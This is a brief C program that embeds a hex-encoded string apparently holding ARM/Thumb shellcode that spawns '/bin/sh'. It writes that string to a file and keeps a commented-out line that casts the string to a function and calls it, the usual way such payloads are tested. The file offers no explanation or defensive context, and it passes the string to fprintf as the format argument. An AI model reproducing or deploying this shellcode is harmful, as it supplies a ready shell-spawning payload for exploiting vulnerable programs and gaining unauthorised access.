#include <stdio.h>

char *SC = "01308fe2"
           "13ff2fe1"
           "241b201c"
           "172701df"
           "78460a30"
           "019001a9"
           "921a0b27"
           "01df2f2f"
           "62696e2f"
           "7368";


int main(void)
{
	FILE *f;
	f = fopen("sc", "w" );
        fprintf(f,SC);
//        (*(void(*)()) SC)();
return 0;
}
